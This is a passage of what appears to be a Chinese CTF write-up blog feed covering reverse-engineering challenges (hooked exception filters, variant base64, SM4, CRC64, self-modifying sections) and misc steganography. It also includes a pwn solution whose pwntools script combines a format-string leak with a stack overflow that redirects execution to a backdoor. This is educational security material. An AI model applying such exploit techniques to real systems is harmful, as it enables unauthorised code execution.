class="built_in">strlen</span>(s); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[i];</span><br><span class="line">s[i] = s[i+<span class="number">1</span>];</span><br><span class="line">s[i+<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">strlen</span>(s)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s)/<span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[k];</span><br><span class="line">s[k] = s[i];</span><br><span class="line">s[i] = temp;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</span></span><br></pre></td></tr></table></figure><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>打开程序，出现hooked，表示已经对程序中的的函数hook成功。</p><p>而之前我也在逆向工程核心原理一书中看到过该章节的一点内容，它的介绍：</p><blockquote><p><strong>代码逆向分析中，钩取（hooking）是一种截取信息，更改程序流程，添加新功能的技术。</strong></p></blockquote><p>ida中找到main函数后，会发现很奇怪，有一个异常，且没有操作输入flag的函数，猜测是hook改变了程序的程序流程。但可以通过数据交叉引用找到关键函数。</p><p>看了一下所有与计算输入数据与比较数据相关的函数，了解大致流程后，OD进行动调看看：</p><p>其中main函数中的MessageBox函数执行后并没有正常的执行，而是跳到了一个新的函数，也是ida中分析过的过数据加密的函数。结合ida继续动调：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173123252.png" alt="image-20200815173123252"></p><p>OD中看到跳到的main函数触发异常的地方，但是程序无法处理的异常。。。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173417257.png" alt="image-20200815173417257"></p><p>那上图中的<strong>TopLevelExceptionFilter</strong>关键加密函数不执行的嘛。。使用PEtools来dump出正常执行的程序看到数据改变了的，那是执行了的。。</p><p>百度一下<strong>SetUnhandledExceptionFilter(TopLevelExceptionFilter)</strong>函数：<strong>简单来说就是设置一个发生异常处理的函数，且它会将原来默认处理异常的函数hook掉。且我们的程序要不处于调试状态才会去执行它设置的异常处理函数。<a href="https://blog.csdn.net/xiaoyafang123/article/details/52161106" target="_blank" rel="noopener">介绍</a></strong> </p><p>参数：lpTopLevelExceptionFilter 函数指针。当异常发生时，且程序不处于调试模式（在vs或者别的调试器里运行）则首先调用该函数。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815175235431.png" alt="image-20200815175235431"></p><p>程序流程清楚了，开始分析算法：</p><p>第二个加密函数变种的base64，但第一个看不出什么名堂，自己逆的话感觉工程量肯定大且很大几率搞不出来。。</p><p>就想着先把变种的base64先解密，但一直解密乱码。。不能啊，自己也写了2个函数来测试，能将变种加密的base64还原为正常base64加密的，但题中的密文不行，。。</p><p>模拟本题的变种base64加密（也是从模拟发现是base64的）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+E4h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+F0h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+FCh] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+108h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+114h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+120h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+12Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+138h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> str[] = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span>;</span><br><span class="line">  <span class="keyword">char</span> Str[] = <span class="string">"123456"</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( v8 % <span class="number">3</span> )</span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>) + <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*(v9+<span class="number">1</span>));</span><br><span class="line">  v7[v9] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j )</span><br><span class="line">      v3 |= (<span class="keyword">unsigned</span> __int8)Str[j + i] &lt;&lt; <span class="number">8</span> * (<span class="number">2</span> - j);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">4</span> - (i + <span class="number">3</span> - v8) &amp;&amp; i + <span class="number">3</span> &gt; v8 )</span><br><span class="line">        v7[v5] = <span class="string">'!'</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        temp = (((v3 &gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - k)) &amp; <span class="number">0x3F</span>)+<span class="number">24</span>)%<span class="number">64</span>, v7[v5] = str[temp], <span class="built_in">printf</span>(<span class="string">"%d "</span>, temp);;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">puts</span>(v7); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加密后：KRGlLBSo</span></span><br></pre></td></tr></table></figure><p>还原成正常加密的base64密文：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"KRGlLBSo"</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"><span class="keyword">char</span> a1[] = &#123;<span class="number">20</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">36</span>,</span><br><span class="line"> <span class="number">14</span>, <span class="number">50</span>, <span class="number">22</span>, <span class="number">18</span>, <span class="number">47</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">56</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; a[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line"><span class="keyword">if</span>(a[i] == s[j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = j;</span><br><span class="line"><span class="keyword">if</span>(t &lt;= <span class="number">25</span>)</span><br><span class="line">t += <span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(t &lt;= <span class="number">51</span>)</span><br><span class="line">t -= <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">64</span>; k++)</span><br><span class="line"><span class="keyword">if</span>((k+<span class="number">24</span>)%<span class="number">64</span> == t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(s[k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//还原为正常base64加密密文：MTIzNDU2</span></span><br></pre></td></tr></table></figure><p>正常base64解密：可以看到，解密出明文。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181032181.png" alt="image-20200815181032181"></p><p>就这样卡住了。。。也无心看第一个加密了。</p><p>不行，去看了看writeup，原来这个解密出本来就是乱码，转化为16进制就好。。。又直接看了第一个加密是sm4。。</p><p>它在加密中其实有标志的：<strong>一是表，二是0xA3B1BAC6</strong><img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181639575.png" alt="image-20200815181639575"></p><p><img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181823633.png" alt="image-20200815181823633"></p><p>最后python安装pysm4进行解密：</p><p>首先base64解密且转化为16进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(c).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">s = <span class="string">"WdCVKQ3yQAYU9I0naQaHTg=="</span></span><br><span class="line">s1 = b64decode(s)</span><br><span class="line"></span><br><span class="line">ans = str_to_hex(s1)</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>sm4解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="comment">#密钥</span></span><br><span class="line">mk = <span class="number">0x77686572655f6172655f755f6e6f773f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line">cipher_num = <span class="number">0x59d095290df2400614f48d276906874e</span></span><br><span class="line"></span><br><span class="line">clear_num = decrypt(cipher_num, mk)</span><br><span class="line">s = hex(clear_num)[<span class="number">2</span>:]</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(s[j]+s[j+<span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]])</span><br><span class="line">print(hex_to_str(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag：SM4foRExcepioN?!</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年DASCTF七月线上赛</title>
      <link href="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>===</p><a id="more"></a><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="虚假签到"><a href="#虚假签到" class="headerlink" title="虚假签到"></a>虚假签到</h3><p>checksec后，32位文件，只有NX栈不可执行保护。</p><p>载入ida后发现明显的栈溢出与格式字符串漏洞，且保护没有canary，在程序的字符中还可以看见backdoor。但是分析栈空间的时候发现多出来了个局部变量。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726120631920.png" alt="image-20200726120631920"></p><p>然后接着看汇编代码，发现这个局部变量有着canary的类似的作用，因为程序最后要靠它获得esp，那我们把它随便覆盖值的话肯定会导致程序访问无效地址出错。且程序在上图的r与s之间还多出了16字节的空间。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121145913.png" alt="image-20200726121145913"></p><p>在gdb中清晰的看到：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121303857.png" alt="image-20200726121303857"></p><p>所以按照以往改变返回地址来控制程序走向的话要多覆盖16字节数据然后通过第二次溢出将覆盖的局部变量改变回原来的值。写脚本攻击，失败。。。</p><p>又分析了栈的分布，没有错啊。发现程序中的格式化字符漏洞我没有用，才想起程序的栈随机化。每次加载程序的栈地址不一样，我不能把gdb调试看到的栈地址在脚本中用。</p><p>gdb找ebp-4的位置。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726122351066.png" alt="image-20200726122351066"></p><p>再次脚本攻击成功：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./qiandao'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(<span class="string">"%13$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = <span class="number">0x24</span>*<span class="string">'a'</span> + p32(addr) + <span class="number">0x14</span>*<span class="string">'a'</span> + p32(<span class="number">0x0804857D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="welcome-to-the-misc-world"><a href="#welcome-to-the-misc-world" class="headerlink" title="welcome to the misc world"></a>welcome to the misc world</h3><p>附件下载解压后一张png图片与一个压缩包，压缩包要密码，显然要从所给png图片找密码。</p><p>png图片是名字红蓝猜测rb隐写。因为是png图片直接使用zsteg工具看一下，可以看到隐藏了一张图片，提取出来发现密码：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130546581.png" alt="image-20200726130546581"></p><p>用360压缩打开压缩包，可以看到有ntfs隐写流文本文件，直接输入密码查看：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130709679.png" alt="image-20200726130709679"></p><p>以为是flag，提交但是错误的，这里就懵了很久。。。</p><p>后面想到还有一个hint.png图片，打开看没什么，拖进010editor发现最后有一长段字符：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132148398.png" alt="image-20200726132148398"></p><p>从字符组成猜测是base64，解码后：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132234920.png" alt="image-20200726132234920"></p><p>从这里明确了就是base64编码，但是解出的编码还是不清楚是什么，但确定是一种编码，进入编码网站把觉得会是都试了下，在escape编码发现：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132440317.png" alt="image-20200726132440317"></p><p>然后记得有一种核心价值观编码，在这个编码网站也有（真的齐全），解码后：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132629311.png" alt="image-20200726132629311"></p><p>那么之前flag里的内容就是通过base85加密后的，解密base85得到flag:<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132735367.png" alt="image-20200726132735367"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2020</title>
      <link href="/2020/07/10/SCTF2020/"/>
      <url>/2020/07/10/SCTF2020/</url>
      
        <content type="html"><![CDATA[<p>刚开始接触，不会的太多了。</p><a id="more"></a><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>题目下载下来很大，一般的exe文件都不会这么大，可以考虑是从py文件打包成的exe文件。</p><p>载入ida看一下字符串，有很多py开头的和__main__的。从经验来看，这是pyinstaller打包的。使用<code>python    pyinstxtractor.py    signin.exe</code> 还原python代码。对其中main文件进行文件头补齐，然后使用<code>uncompyle6 -o main.py main.pyc</code>将.pyc转化为.py文件。</p><p>但是由于这是python3.8写的py文件，如果在python3.7下使用uncompyle6会提示文件有损，使用python3.8。去升级了python3.8后。<img src="/2020/07/10/SCTF2020/image-20200714101947068.png" alt="image-20200714101947068"></p><p>打开py文件，程序启动会释放一个dll文件（这在运行程序的时候可以看到）。整体逻辑还是很简单，首先将一个账户以字典形式存储，然后将我们输入的name与密码传入dll文件的一个加密函数后返回，判断与存储的账户是否相等。</p><p>ida载入dll文件的enc加密函数：一个CRC64与异或。<img src="/2020/07/10/SCTF2020/image-20200714102629777.png" alt="image-20200714102629777"></p><p>如果之前接触过CRC64，那这里就会很简单。但是我第一次遇到，有点恼火。</p><p>首先使用python得到异或之前的key：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = list(base64.b64decode(<span class="string">b'PLHCu+fujfZmMOMLGHCyWWOq5H5HDN2R5nHnlV30Q0EA'</span>))</span><br><span class="line">t = <span class="string">"SCTFer"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">s[i] ^= ord(t[i%len(t)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure><p>C语言写CRC64解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] = &#123;<span class="number">111</span>, <span class="number">242</span>, <span class="number">150</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">156</span>, <span class="number">222</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">121</span>, <span class="number">75</span>, <span class="number">51</span>, <span class="number">230</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">216</span>, <span class="number">183</span>, <span class="number">61</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">184</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">179</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">134</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">84</span>&#125;;</span><br><span class="line">_int64 *ans = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (_int64 *)(s+i);</span><br><span class="line"><span class="keyword">if</span>(*ans &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[j]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<img src="/2020/07/10/SCTF2020/image-20200714103110024.png" alt="image-20200714103110024"></p><p><strong>总结：1.CRC64加密与解密。2.反编译python文件。</strong></p><h3 id="get-up"><a href="#get-up" class="headerlink" title="get_up"></a>get_up</h3><p>运行一下，提示输入一个word。载入ida，shift+f12看到该字符串，来到引用的地方：<img src="/2020/07/10/SCTF2020/image-20200714150947146.png" alt="image-20200714150947146"></p><p>进入sub_401df0：开始只是感觉复杂，但看见输入单词加密后与<strong>32位的a-f+0-9</strong>的字符串，猜测是md5加密。随便找了一个cmd5网站解密：<img src="/2020/07/10/SCTF2020/image-20200714151246530.png" alt="image-20200714151246530"></p><p>继续看下面的sub_402B00(“.reioc”)ke：进入可以看到是先获得image_base，然后依次加地址，直到获得.reioc节区的首地址。</p><p>最后引用输入的：sycsyc对.reioc节区进行了重写。这里使用idcpython脚本或载入OD动调都可以得到改写后的节区。</p><p>载入OD，调试可以发现重写的代码正是接下来要执行的，dump再载入ida：<img src="/2020/07/10/SCTF2020/image-20200714152255641.png" alt="image-20200714152255641"></p><p>可以看到与之前的类似，但这次是改写.ebata节区，使用同样的方法，OD中dump出载入ida。</p><p>进入改写.ebata后的最后一个节区：<img src="/2020/07/10/SCTF2020/image-20200714152729970.png" alt="image-20200714152729970"></p><p>看加密函数：<img src="/2020/07/10/SCTF2020/image-20200714152932947.png" alt="image-20200714152932947"></p><p>从OD动调得到表后写C语言爆破：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 